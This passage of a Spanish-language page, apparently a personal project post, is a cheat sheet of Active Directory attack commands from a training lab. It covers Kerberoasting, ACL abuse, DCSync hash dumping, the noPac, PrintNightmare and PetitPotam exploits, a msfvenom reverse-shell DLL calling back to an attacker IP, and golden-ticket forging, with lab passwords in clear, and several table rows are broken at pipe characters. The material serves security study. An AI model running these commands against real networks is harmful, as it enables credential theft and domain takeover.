-SPN</td><td>Get-DomainSPNTicket -Format Hashcat</td></tr><tr><td><code>cat .\ilfreight_tgs.csv</code></td><td>Utilizado para ver el contenido del archivo .csv desde un host basado en Windows.</td></tr><tr><td><code>.\Rubeus.exe</code></td><td>Utilizado para ver las opciones y funcionalidad posibles con la herramienta Rubeus. Realizado desde un host basado en Windows.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /stats</code></td><td>Utilizado para verificar las estadísticas de kerberoast (<code>/stats</code>) dentro del dominio Windows objetivo desde un host basado en Windows.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td><td>Utilizado para solicitar/descargar tickets TGS para cuentas con el recuento de administrador establecido en 1, luego formatea la salida de una manera fácil de ver (<code>/nowrap</code>). Realizado desde un host basado en Windows.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td>Utilizado para solicitar/descargar un ticket TGS para un usuario específico (<code>/user:testspn</code>) luego formatea la salida de una manera fácil de ver y crackear (<code>/nowrap</code>). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainUser testspn -Properties samaccountname, serviceprincipalname, msds-supportedencryptiontypes</code></td><td>Herramienta de PowerView utilizada para verificar el atributo <code>msds-supportedencryptiontypes</code> asociado con una cuenta de usuario específica (<code>testspn</code>). Realizado desde un host basado en Windows.</td></tr><tr><td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td>Utilizado para intentar crackear el hash del ticket usando una lista de palabras (<code>rockyou.txt</code>) desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="enumeración-y-tácticas-de-acl">Enumeración y Tácticas de ACL</h3>













































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Find-InterestingDomainAcl</code></td><td>Herramienta de PowerView utilizada para encontrar ACLs de objetos en el dominio Windows objetivo con derechos de modificación establecidos en objetos no integrados desde un host basado en Windows.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code> seguido de <code>$sid = Convert-NameToSid wley</code></td><td>Utilizado para importar PowerView y recuperar el SID de una cuenta de usuario específica (<code>wley</code>) desde un host basado en Windows.</td></tr><tr><td>`Get-DomainObjectACL -Identity *</td><td>? {$_.SecurityIdentifier -eq $sid}`</td></tr><tr><td><code>$guid= "00299570-246d-11d0-a768-00aa006e0529"</code> seguido de `Get-ADObject -SearchBase “CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)” -Filter {ObjectClass -like ‘ControlAccessRight’} -Properties *</td><td>Select Name, DisplayName, DistinguishedName, rightsGuid</td></tr><tr><td>`Get-DomainObjectACL -ResolveGUIDS -Identity *</td><td>? {$_.SecurityIdentifier -eq $sid}`</td></tr><tr><td>`Get-ADUser -Filter *</td><td>Select-Object -ExpandProperty SamAccountName > ad_users.txt`</td></tr><tr><td>`foreach ($line in [System.IO.File]::ReadLines(“C:\Users\htb-student\Desktop\ad_users.txt”)) {get-acl “AD:$(Get-ADUser $line)“</td><td>Select-Object Path -ExpandProperty Access</td></tr><tr><td><code>$SecPassword = ConvertTo-SecureString &#x3C;PASSWORD HERE> -AsPlainText -Force</code></td><td>Utilizado para crear un Objeto SecureString desde un host basado en Windows.</td></tr><tr><td><code>$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)</code></td><td>Utilizado para crear un Objeto PSCredential desde un host basado en Windows.</td></tr><tr><td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td>Herramienta de PowerView utilizada para cambiar la contraseña de un usuario específico (<code>damundsen</code>) en un dominio Windows objetivo desde un host basado en Windows.</td></tr><tr><td>`Get-ADGroup -Identity “Help Desk Level 1” -Properties Members</td><td>Select -ExpandProperty Members`</td></tr><tr><td><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td><td>Herramienta de PowerView utilizada para añadir un usuario específico (<code>damundsen</code>) a un grupo de seguridad específico (<code>Help Desk Level 1</code>) en un dominio Windows objetivo desde un host basado en Windows.</td></tr><tr><td>`Get-DomainGroupMember -Identity “Help Desk Level 1”</td><td>Select MemberName`</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code>1</td><td>Herramienta de PowerView utilizada para crear un Nombre Principal de Servicio falso dado un usuario específico (<code>adunn</code>) desde un host basado en Windows.2</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td>Herramienta de PowerView utilizada para eliminar el Nombre Principal de Servicio falso creado durante el ataque desde un host basado en Windows.</td></tr><tr><td><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td><td>Herramienta de PowerView utilizada para eliminar un usuario específico (<code>damundsen</code>) de un grupo de seguridad específico (<code>Help Desk Level 1</code>) desde un host basado en Windows.</td></tr><tr><td><code>ConvertFrom-SddlString</code></td><td>Cmd-let de PowerShell utilizado para convertir una cadena SDDL a un formato legible. Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="dcsync">DCSync</h3>

























<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td>`Get-DomainUser -Identity adunn</td><td>select samaccountname, objectsid, memberof, useraccountcontrol</td></tr><tr><td><code>$sid = "1-5-21-3842939050-3880317879-2865463114-1164"</code> seguido de `Get-ObjectAcl “DC=inlanefreight,DC=local” -ResolveGUIDS</td><td>? { ($_.ObjectAceType -match ‘Replication-Get’)}</td></tr><tr><td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td>Herramienta de Impacket utilizada para extraer hashes NTLM del archivo NTDS.dit alojado en un Controlador de Dominio objetivo (172.16.5.5) y guardar los hashes extraídos en un archivo (<code>inlanefreight_hashes</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td>Usa Mimikatz para realizar un ataque dcsync desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="acceso-privilegiado-y-mssql">Acceso Privilegiado y MSSQL</h3>

































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td><td>Herramienta basada en PowerView utilizada para enumerar el grupo de Usuarios de Escritorio Remoto en un objetivo Windows (<code>-ComputerName ACADEMY-EA-MS01</code>) desde un host basado en Windows.</td></tr><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td><td>Herramienta basada en PowerView utilizada para enumerar el grupo de Usuarios de Administración Remota en un objetivo Windows (<code>-ComputerName ACADEMY-EA-MS01</code>) desde un host basado en Windows.</td></tr><tr><td><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td><td>Crea una variable (<code>$password</code>) establecida igual a la contraseña (<code>Klmcargo2</code>) de un usuario desde un host basado en Windows.</td></tr><tr><td><code>$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)</code></td><td>Crea una variable (<code>$cred</code>) establecida igual al nombre de usuario (<code>forend</code>) y contraseña (<code>$password</code>) de una cuenta de dominio objetivo desde un host basado en Windows.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td>Usa el cmd-let de PowerShell <code>Enter-PSSession</code> para establecer una sesión de PowerShell con un objetivo a través de la red (<code>-ComputerName ACADEMY-EA-DB01</code>) desde un host basado en Windows. Se autentica usando credenciales hechas en los 2 comandos mostrados anteriormente.</td></tr><tr><td><code>evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2</code></td><td>Utilizado para establecer una sesión de PowerShell con un objetivo Windows desde un host basado en Linux usando WinRM.</td></tr><tr><td><code>Import-Module .\PowerUpSQL.ps1</code></td><td>Utilizado para importar la herramienta PowerUpSQL.</td></tr><tr><td><code>Get-SQLInstanceDomain</code></td><td>Herramienta PowerUpSQL utilizada para enumerar instancias de servidor SQL desde un host basado en Windows.</td></tr><tr><td><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td><td>Herramienta PowerUpSQL utilizada para conectarse a un servidor SQL y consultar la versión (<code>-query 'Select @@version'</code>) desde un host basado en Windows.</td></tr><tr><td><code>mssqlclient.py -h</code></td><td>Herramienta de Impacket utilizada para mostrar la funcionalidad y opciones proporcionadas con <code>mssqlclient.py</code> desde un host basado en Linux.</td></tr><tr><td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td>Herramienta de Impacket utilizada para conectarse a un servidor MSSQL desde un host basado en Linux.</td></tr><tr><td><code>SQL> help</code></td><td>Utilizado para mostrar opciones de <code>mssqlclient.py</code> una vez conectado a un servidor MSSQL.</td></tr><tr><td><code>SQL> enable_xp_cmdshell</code></td><td>Utilizado para habilitar el procedimiento almacenado <code>xp_cmdshell</code> que permite ejecutar comandos del SO a través de la base de datos desde un host basado en Linux.</td></tr><tr><td><code>xp_cmdshell whoami /priv</code></td><td>Utilizado para enumerar derechos en un sistema usando <code>xp_cmdshell</code>.</td></tr></tbody></table>
<h3 id="nopac-printnightmare-y-petitpotam">NoPac, PrintNightmare y PetitPotam</h3>





















































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td>Utilizado para clonar un exploit noPac usando git. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td>Ejecuta <code>scanner.py</code> para verificar si un sistema objetivo es vulnerable a noPac/Sam_The_Admin desde un host basado en Linux.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td>Utilizado para explotar la vulnerabilidad noPac/Sam_The_Admin y obtener una shell SYSTEM (<code>-shell</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td>Utilizado para explotar la vulnerabilidad noPac/Sam_The_Admin y realizar un ataque DCSync contra la cuenta de Administrador integrada en un Controlador de Dominio desde un host basado en Linux.</td></tr><tr><td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td>Utilizado para clonar un exploit PrintNightmare usando git desde un host basado en Linux.</td></tr><tr><td><code>pip3 uninstall impacket</code> seguido de comandos de instalación de git</td><td>Utilizado para asegurar que la versión de Impacket del autor del exploit (cube0x0) esté instalada. Esto también desinstala cualquier versión previa de Impacket en un host basado en Linux.</td></tr><tr><td>`rpcdump.py @172.16.5.5</td><td>egrep ‘MS-RPRN</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll</code></td><td>Utilizado para generar un payload DLL para ser usado por el exploit para obtener una sesión de shell. Realizado desde un host basado en Windows (nota: contexto sugiere host atacante, posiblemente Linux generando payload Windows).</td></tr><tr><td><code>sudo smbserver.py smb2support CompData /path/to/backupscript.dll</code></td><td>Utilizado para crear un servidor SMB y alojar una carpeta compartida (<code>CompData</code>) en la ubicación especificada en el host linux local. Esto se puede usar para alojar el payload DLL que el exploit intentará descargar al host objetivo. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&#x3C;username>:&#x3C;password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'</code></td><td>Ejecuta el exploit y especifica la ubicación del payload DLL. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo ntlmrelayx.py -debug -smb2support -target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td><td>Herramienta de Impacket utilizada para crear un relay NTLM especificando la URL de inscripción web para el host de la Autoridad de Certificación. Realizado desde un host basado en Linux.</td></tr><tr><td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td>Utilizado para ejecutar el exploit PetitPotam especificando la dirección IP del host de ataque (172.16.5.255) y el Controlador de Dominio objetivo (172.16.5.5). Realizado desde un host basado en Linux.</td></tr><tr><td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &#x3C;base64 certificate> = dc01.ccache</code></td><td>Usa <code>gettgtpkinit.py</code> para solicitar un ticket TGT para el Controlador de Dominio (<code>dc01.ccache</code>) desde un host basado en Linux.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Herramienta de Impacket utilizada para realizar un ataque DCSync y recuperar uno o todos los hashes de contraseña NTLM. Realizado desde un host basado en Linux.</td></tr><tr><td><code>klist</code></td><td>Comando utilizado para ver el contenido del archivo ccache. Realizado desde un host basado en Linux.</td></tr><tr><td><code>python /opt/PKINITtools/getnthash.py -key &#x3C;key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td>Utilizado para enviar solicitudes TGS usando <code>getnthash.py</code> desde un host basado en Linux.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes &#x3C;hash></code></td><td>Herramienta de Impacket utilizada para extraer hashes de NTDS.dit usando un ataque DCSync y un hash capturado (<code>-hashes</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:&#x3C;base64_cert> /ptt</code></td><td>Usa Rubeus para solicitar un TGT y realizar un ataque pass-the-ticket usando la cuenta de máquina (<code>/user:ACADEMY-EA-DC01$</code>) de un objetivo Windows. Realizado desde un host basado en Windows.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td><td>Realiza un ataque DCSync usando Mimikatz. Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="configuraciones-erróneas-varias-y-gpos">Configuraciones Erróneas Varias y GPOs</h3>





































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Import-Module .\SecurityAssessment.ps1</code></td><td>Utilizado para importar el módulo <code>SecurityAssessment.ps1</code>. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Herramienta basada en <code>SecurityAssessment.ps1</code> utilizada para enumerar un objetivo Windows para el bug de impresora MS-PRN. Realizado desde un host basado en Windows.</td></tr><tr><td><code>adidnsdump -u inlanefreight\forend ldap://172.16.5.5</code></td><td>Utilizado para resolver todos los registros en una zona DNS sobre LDAP desde un host basado en Linux.</td></tr><tr><td><code>adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r</code></td><td>Utilizado para resolver registros desconocidos en una zona DNS realizando una consulta A (<code>-r</code>) desde un host basado en Linux.</td></tr><tr><td>`Get-DomainUser</td><td>Select-Object samaccountname, description`</td></tr><tr><td>`Get-DomainUser -UACFilter PASSWD_NOTREQD</td><td>Select-Object samaccountname, useraccountcontrol`</td></tr><tr><td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td>Utilizado para listar el contenido de un recurso compartido alojado en un objetivo Windows desde el contexto de un usuario actualmente conectado. Realizado desde un host basado en Windows.</td></tr><tr><td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td>Herramienta utilizada para descifrar una contraseña de preferencia de política de grupo capturada desde un host basado en Linux.</td></tr><tr><td>`crackmapexec smb -L</td><td>grep gpp`</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td>Localiza y recupera cualquier credencial almacenada en el recurso compartido sysvol de un objetivo Windows usando CrackMapExec desde un host basado en Linux.</td></tr><tr><td>`Get-DomainGPO</td><td>select displayname`</td></tr><tr><td>`Get-GPO -All</td><td>Select DisplayName`</td></tr><tr><td><code>$sid = Convert-NameToSid "Domain Users"</code></td><td>Crea una variable llamada <code>$sid</code> que se establece igual a la herramienta <code>Convert-NameToSid</code> y especifica la cuenta de grupo Domain Users. Realizado desde un host basado en Windows.</td></tr><tr><td>`Get-DomainGPO</td><td>Get-DomainObjectAcl</td></tr><tr><td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td>Cmd-let de PowerShell utilizado para mostrar el nombre de un GPO dado un GUID. Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="asreproasting">ASREPRoasting</h3>

























<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td>`Get-DomainUser -PreauthNotRequired</td><td>select samaccountname, userprincipalname, useraccountcontrol</td></tr><tr><td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td>Usa Rubeus para realizar un ataque ASREP Roasting y formatea la salida para Hashcat. Realizado desde un host basado en Windows.</td></tr><tr><td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code></td><td>Usa Hashcat para intentar crackear el hash capturado usando una lista de palabras (<code>rockyou.txt</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></td><td>Enumera usuarios en un dominio Windows objetivo y recupera automáticamente los hashes AS-REP para cualquier usuario encontrado que no requiera pre-autenticación Kerberos. Realizado desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="relaciones-de-confianza-trust-relationships">Relaciones de Confianza (Trust Relationships)</h3>

























































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Import-Module activedirectory</code></td><td>Utilizado para importar el módulo de Active Directory. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>Cmd-let de PowerShell utilizado para enumerar las relaciones de confianza de un dominio Windows objetivo. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>Herramienta de PowerView utilizada para enumerar las relaciones de confianza de un dominio Windows objetivo. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>Herramienta de PowerView utilizada para realizar un mapeo de confianza de dominio desde un host basado en Windows.</td></tr><tr><td>`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL</td><td>select SamAccountName`</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td>Usa Mimikatz para obtener el Hash NT de la cuenta KRBTGT desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainSID</code></td><td>Herramienta de PowerView utilizada para obtener el SID para un dominio hijo objetivo desde un host basado en Windows.</td></tr><tr><td>`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity “Enterprise Admins”</td><td>select distinguishedname, objectsid`</td></tr><tr><td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td>Utilizado para intentar listar el contenido del disco C en un Controlador de Dominio objetivo. Realizado desde un host basado en Windows.</td></tr><tr><td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:&#x3C;sid> /krbtgt:&#x3C;hash> /sids:&#x3C;sids> /ptt</code></td><td>Usa Mimikatz para crear un Golden Ticket desde un host basado en Windows.</td></tr><tr><td><code>.\Rubeus.exe golden /rc4:&#x3C;hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:&#x3C;sid> /sids:&#x3C;sids> /user:hacker /ptt</code></td><td>Usa Rubeus para crear un Golden Ticket desde un host basado en Windows.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td>Usa Mimikatz para realizar un ataque DCSync desde un host basado en Windows.</td></tr><tr><td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td>Herramienta de Impacket utilizada para realizar un ataque DCSync desde un host basado en Linux.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></td><td>Herramienta de Impacket utilizada para realizar un ataque de fuerza bruta de SID desde un host basado en Linux.</td></tr><tr><td>`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</td><td>grep “Domain SID”`</td></tr><tr><td>`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5</td><td>grep -B12 “Enterprise Admins”`</td></tr><tr><td><code>ticketer.py -nthash &#x3C;hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid &#x3C;sid> -extra-sid &#x3C;sid> hacker</code></td><td>Herramienta de Impacket utilizada para crear un Golden Ticket desde un host basado en Linux.</td></tr><tr><td><code>export KRB5CCNAME=hacker.ccache</code></td><td>Utilizado para establecer la Variable de Entorno <code>KRB5CCNAME</code> desde un host basado en Linux.</td></tr><tr><td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td>Herramienta de Impacket utilizada para establecer una sesión de shell con un Controlador de Dominio objetivo desde un host basado en Linux.</td></tr><tr><td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td>Herramienta de Impacket que realiza automáticamente un ataque que escala de dominio hijo a padre.</td></tr></tbody></table>
<h3 id="relaciones-de-confianza---cross-forest">Relaciones de Confianza - Cross-Forest</h3>









































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td>`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL</td><td>select SamAccountName`</td></tr><tr><td>`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc</td><td>select samaccountname, memberof`</td></tr><tr><td><code>.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td>Usa Rubeus para realizar un Ataque de Kerberoasting contra un dominio Windows objetivo (<code>/domain:FREIGHTLOGISTICS.LOCAL</code>) desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td>Herramienta de PowerView utilizada para enumerar grupos con usuarios que no pertenecen al dominio desde un host basado en Windows.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td>Cmd-let de PowerShell utilizado para conectarse remotamente a un sistema Windows objetivo desde un host basado en Windows.</td></tr><tr><td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td>Herramienta de Impacket utilizada para solicitar (<code>-request</code>) el ticket TGS de una cuenta en un dominio Windows objetivo (<code>-target-domain</code>) desde un host basado en Linux.</td></tr><tr><td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td>Ejecuta la implementación en Python de BloodHound contra un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td><code>zip -r ilfreight_bh.zip *.json</code></td><td>Utilizado para comprimir múltiples archivos en 1 solo archivo .zip para ser subido a la GUI de BloodHound.</td></tr></tbody></table> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
← Volver a la lista de proyectos
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
© 2025 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>